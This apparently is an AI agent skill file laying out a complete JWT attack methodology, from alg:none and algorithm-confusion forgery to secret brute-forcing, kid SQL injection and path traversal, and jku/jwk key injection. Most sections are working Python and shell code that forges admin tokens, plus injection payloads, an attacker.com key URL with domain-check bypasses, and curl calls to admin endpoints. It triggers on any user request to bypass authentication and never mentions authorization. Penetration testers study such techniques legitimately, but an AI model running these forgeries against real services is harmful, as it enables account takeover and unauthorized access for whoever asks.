---
name: jwt-cracker
description: Full JWT attack methodology — alg:none, RS256 to HS256 confusion, weak secret brute-force, kid injection, jku/jwk injection, and claim tampering
---

# JWT Attack Methodology

## When to use

Activate this skill when the user asks to:
- test JWT tokens, authentication bypass, or token forgery
- try `alg:none`, algorithm confusion, or weak secret brute-force
- test `kid` injection, `jku`/`x5u` header injection, or embedded `jwk` injection
- check if `exp`, `iss`, or `aud` claims are validated
- bypass authentication on an API or web app
- test a string that looks like a JWT (`xxxxx.yyyyy.zzzzz`)

---

JWT tokens look like: `header.payload.signature` (base64url-encoded, dot-separated).

A JWT vulnerability means the server accepts a token it should reject — either because the signature check is weak, skipped, or bypassable.

**Before anything else — decode the token:**
```bash
# Split and decode (no verification)
echo "HEADER_PART"  | base64 -d 2>/dev/null | python3 -m json.tool
echo "PAYLOAD_PART" | base64 -d 2>/dev/null | python3 -m json.tool
# Or one-liner:
python3 -c "
import base64, json, sys
t = sys.argv[1].split('.')
for part in t[:2]:
    pad = part + '=' * (-len(part) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(pad)), indent=2))
" "YOUR.JWT.HERE"
```

Read the header carefully: note `alg`, `kid`, `jku`, `x5u`, `jwk`. These fields drive which attacks to try first.

---

## Attack Index

| # | Attack | Trigger condition |
|---|--------|-------------------|
| 1 | `alg: none` | Any JWT — always try |
| 2 | RS256 → HS256 confusion | `alg: RS256` or `ES256` in header |
| 3 | Weak HMAC secret | `alg: HS256/384/512` |
| 4 | `kid` SQL injection | `kid` field present in header |
| 5 | `kid` path traversal | `kid` field looks like a filename/path |
| 6 | `jku` / `x5u` header injection | `jku` or `x5u` field present |
| 7 | Embedded `jwk` injection | No `jwk` in header → try injecting one |
| 8 | Claim tampering (no sig check) | After any successful forgery |
| 9 | Expired token acceptance | `exp` claim present |
| 10 | `aud` / `iss` not validated | Claims present — try removing/changing them |
| 11 | Token relay / wrong context | Multiple services share tokens |

Work through them top to bottom; stop and document when one succeeds.

---

## Attack 1 — `alg: none` (No Signature Required)

**What:** Server accepts a token with `"alg":"none"` and an empty signature — effectively skipping verification.

**How:**
```python
import base64, json

def b64url(data):
    if isinstance(data, str): data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()

# Craft header with alg:none
header  = b64url(json.dumps({"alg": "none", "typ": "JWT"}))
# Modify payload as desired (e.g. escalate role, change user id)
payload = b64url(json.dumps({"sub": "1", "role": "admin", "username": "alice"}))

token_none     = f"{header}.{payload}."          # empty signature
token_none_var = f"{header}.{payload}"           # no trailing dot variant

print(token_none)
print(token_none_var)
```

**Variants to try** (servers may check case-sensitively):
- `"alg": "none"`
- `"alg": "None"`
- `"alg": "NONE"`
- `"alg": "nOnE"`

**Confirm:** send the forged token in `Authorization: Bearer <token>`. If the server returns a 200 with the modified user's data → confirmed.

---

## Attack 2 — Algorithm Confusion: RS256 → HS256

**What:** The server uses RS256 (asymmetric). The public key is obtainable. If the library accepts HS256, an attacker can use the **public key as the HMAC secret** to forge valid tokens.

**Why it works:** The server verifies RS256 signatures with the public key. If the library is told `alg: HS256`, it expects HMAC-SHA256 with a symmetric secret. If that secret happens to be the public key, verification passes.

**Step 1 — Obtain the public key:**
```bash
# Common locations
curl https://target.com/.well-known/jwks.json
curl https://target.com/oauth/discovery
curl https://target.com/api/auth/keys
curl https://target.com/.well-known/openid-configuration  # → find jwks_uri
# Also check: /api/keys, /auth/certs, /v1/keys
```

Convert JWK to PEM if needed:
```python
# pip install cryptography
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives import serialization
import base64, json

jwk = json.loads(open('jwk.json').read())  # the 'n' and 'e' fields

def b64int(s):
    return int.from_bytes(base64.urlsafe_b64decode(s + '=='), 'big')

pub = RSAPublicNumbers(b64int(jwk['e']), b64int(jwk['n'])).public_key()
pem = pub.public_bytes(serialization.Encoding.PEM,
                       serialization.PublicFormat.SubjectPublicKeyInfo)
print(pem.decode())
```

**Step 2 — Sign with HS256 using the public key as secret:**
```python
import jwt  # pip install pyjwt
from cryptography.hazmat.primitives import serialization

with open('public.pem', 'rb') as f:
    pubkey_bytes = f.read()

payload = {"sub": "1", "role": "admin", "username": "alice"}

# Use the raw PEM bytes as the HMAC secret
token = jwt.encode(payload, pubkey_bytes, algorithm="HS256")
print(token)
```

**Alternative — jwt_tool:**
```bash
python3 jwt_tool.py TOKEN -X k -pk public.pem
```

---

## Attack 3 — Weak HMAC Secret (Brute-Force)

**What:** The server uses HS256/384/512 with a short, guessable, or default secret.

**Wordlist sources:**
- Common defaults: `secret`, `password`, `jwt`, `changeme`, `supersecret`, `your-256-bit-secret`, `qwerty`, `123456`, application name, domain name
- Full wordlist: see `references/jwt-secrets.txt`

**Tools:**
```bash
# hashcat (GPU — fastest)
hashcat -a 0 -m 16500 token.txt /path/to/wordlist.txt

# john
john --format=HMAC-SHA256 --wordlist=wordlist.txt token.txt

# jwt_tool
python3 jwt_tool.py TOKEN -C -d wordlist.txt

# Online: https://crackstation.net (paste the full JWT)
```

**If secret found — forge any token:**
```python
import jwt

secret = "found_secret"
payload = {"sub": "1", "role": "admin", "iat": 1700000000}
token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

---

## Attack 4 — `kid` SQL Injection

**What:** The `kid` (Key ID) header tells the server which key to fetch from a database. If the value is used in a SQL query unsanitized, it's injectable.

**Header looks like:** `{"alg":"HS256","kid":"1"}` or `{"alg":"HS256","kid":"user-key-prod"}`

**Goal:** make the database return a known value as the key, then sign the token with that value.

**Payload to inject into `kid`:**
```
' UNION SELECT 'attackersecret'--
" UNION SELECT 'attackersecret'--
1' OR '1'='1
```

**Craft the forged token:**
```python
import jwt, json, base64

# Manually build the header (pyjwt won't let you set kid easily)
def b64url(d):
    return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()

header  = {"alg": "HS256", "kid": "' UNION SELECT 'attackersecret'--"}
payload = {"sub": "1", "role": "admin"}

h = base64.urlsafe_b64encode(json.dumps(header).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload).encode()).rstrip(b'=').decode()

import hmac, hashlib
secret = b"attackersecret"
sig = hmac.new(secret, f"{h}.{p}".encode(), hashlib.sha256).digest()
s = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()

print(f"{h}.{p}.{s}")
```

**jwt_tool shortcut:**
```bash
python3 jwt_tool.py TOKEN -I -hc kid -hv "' UNION SELECT 'attackersecret'--" -S hs256 -p "attackersecret"
```

---

## Attack 5 — `kid` Path Traversal

**What:** `kid` is used to load a key from the filesystem. If traversal is possible, point it to a file with a known value (e.g. `/dev/null` → empty string, or a static file).

**Payloads:**
```
../../../../../../dev/null
/dev/null
../../../etc/passwd    (to observe behavior)
../../public/logo.png  (known content → use as secret)
```

**If `kid` → `/dev/null` (empty file), sign with empty string:**
```python
import jwt

header = {"alg": "HS256", "kid": "../../../../../../dev/null"}
payload = {"sub": "1", "role": "admin"}

# Sign with empty string (contents of /dev/null)
token = jwt.encode(payload, "", algorithm="HS256",
                   headers={"kid": "../../../../../../dev/null"})
print(token)
```

---

## Attack 6 — `jku` / `x5u` Header Injection

**What:** `jku` (JWK Set URL) tells the server where to fetch the public key. If the server fetches it without domain validation, point it to an attacker-controlled server with a generated key pair.

**Step 1 — Generate a key pair:**
```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization
import json, base64

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key().public_numbers()

def to_b64(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwks = {"keys": [{"kty":"RSA","n":to_b64(pub.n),"e":to_b64(pub.e),"alg":"RS256","use":"sig","kid":"attacker"}]}
print(json.dumps(jwks, indent=2))  # serve this at your URL
```

**Step 2 — Host the JWKS** (any public URL you control, e.g. webhook.site, Burp Collaborator, your own VPS):
```
https://attacker.com/jwks.json
```

**Step 3 — Forge the token:**
```python
import jwt

with open('attacker_private.pem', 'rb') as f:
    private_key = f.read()

payload = {"sub": "1", "role": "admin"}
token = jwt.encode(payload, private_key, algorithm="RS256",
                   headers={"jku": "https://attacker.com/jwks.json", "kid": "attacker"})
print(token)
```

**Bypass attempts if the server validates the domain:**
```
https://target.com@attacker.com/jwks.json
https://attacker.com/jwks.json?cb=https://target.com
https://target.com/redirect?url=https://attacker.com/jwks.json
```

**Same logic applies to `x5u`** — just serve a self-signed certificate chain instead of JWKS.

---

## Attack 7 — Embedded `jwk` Injection

**What:** The `jwk` header embeds the public key directly inside the token. If the server trusts the embedded key without validating it against a whitelist, you can inject your own key pair.

**Step 1 — Generate key pair (same as Attack 6)**

**Step 2 — Forge token with embedded jwk:**
```python
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
pub = key.public_key().public_numbers()

def to_b64(n):
    return base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,'big')).rstrip(b'=').decode()

jwk_obj = {"kty":"RSA","n":to_b64(pub.n),"e":to_b64(pub.e)}

private_pem = key.private_bytes(serialization.Encoding.PEM,
    serialization.PrivateFormat.TraditionalOpenSSL, serialization.NoEncryption())

payload = {"sub": "1", "role": "admin"}
token = jwt.encode(payload, private_pem, algorithm="RS256",
                   headers={"jwk": jwk_obj})
print(token)
```

**jwt_tool shortcut:**
```bash
python3 jwt_tool.py TOKEN -X i   # injects self-signed jwk
```

---

## Attack 8 — Claim Tampering

**What:** After any successful forgery technique, modify these claims for maximum impact:

| Claim | Attack |
|-------|--------|
| `sub` / `user_id` / `id` | Change to another user's ID → horizontal IDOR |
| `role` / `groups` / `scope` | `"user"` → `"admin"`, `"superuser"`, `"staff"` |
| `email` | Change to victim's email |
| `is_admin` / `is_staff` | `false` → `true` |
| `plan` / `tier` | `"free"` → `"premium"` |
| `permissions` | Add `"*"`, `"write"`, `"delete"` |
| `org_id` / `tenant_id` | Switch to another org's ID |
| `exp` | Set to far future (year 9999) |

**Always try admin/privileged endpoints after forging:**
```bash
curl https://target.com/api/admin/users -H "Authorization: Bearer FORGED_TOKEN"
curl https://target.com/api/admin/config -H "Authorization: Bearer FORGED_TOKEN"
```

---

## Attack 9 — Expired Token Acceptance

**What:** Server doesn't validate the `exp` claim — old tokens work forever.

**Test:**
```bash
# Take a token you had yesterday (or an old one from logs/history)
curl https://target.com/api/profile -H "Authorization: Bearer OLD_EXPIRED_TOKEN"
```

**Also try:** setting `exp` to a past timestamp while using a valid signature — if the server accepts it, `exp` is not validated.

---

## Attack 10 — `iss` / `aud` Not Validated

**What:** Server doesn't verify who issued the token or who it's intended for.

**Test — remove the claims entirely:**
```python
# Craft a token with no iss/aud
payload = {"sub": "1", "role": "admin"}  # no iss, no aud
```

**Test — change to arbitrary values:**
```python
payload = {"sub": "1", "iss": "https://evil.com", "aud": "different-service"}
```

If the server accepts either — the claims are not validated.

**Cross-service relay:** if multiple microservices share a signing key but each should only accept tokens for itself, a token issued for Service A may work on Service B if `aud` is not validated.

---

## Attack 11 — Token Relay (Cross-Service Misuse)

**What:** A token scoped for one service works on another because they share the same secret/key and don't validate `aud` or `iss`.

**Test:**
1. Get a token from Service A (e.g., `/api/auth`)
2. Use it directly on Service B (e.g., `/internal/api`, `/admin`, another subdomain)
3. Look for microservices via JS files, API docs, subdomains, or error messages

---

## Quick Recon Checklist

Before choosing attacks, collect:

```bash
# 1. Decode your token
python3 -c "import base64,json,sys; [print(json.dumps(json.loads(base64.urlsafe_b64decode(p+'===='[:(-len(p))%4+4]),indent=2)) or '') for p in sys.argv[1].split('.')[:2]]" "YOUR.JWT.TOKEN"

# 2. Hunt for public keys
for path in /.well-known/jwks.json /api/keys /oauth/certs /auth/keys /jwks /.well-known/openid-configuration; do
  code=$(curl -s -o /dev/null -w "%{http_code}" https://target.com$path)
  echo "$code $path"
done

# 3. Check error messages — they often leak library name/version
curl https://target.com/api/profile -H "Authorization: Bearer invalid.token.here"

# 4. Check JS bundles for JWT library and secret hints
curl -s https://target.com/app.js | grep -Ei "jwt|secret|signing|HS256|RS256|verify"
```

---

## Tool Reference

See `references/tools.md` for detailed usage of:
- **jwt_tool** — the primary CLI tool for all JWT attacks
- **hashcat / john** — HMAC secret brute-force
- **pyjwt** — Python library for crafting tokens
- **Burp JWT Editor** — in-proxy attack suite

See `references/jwt-secrets.txt` for the brute-force wordlist.
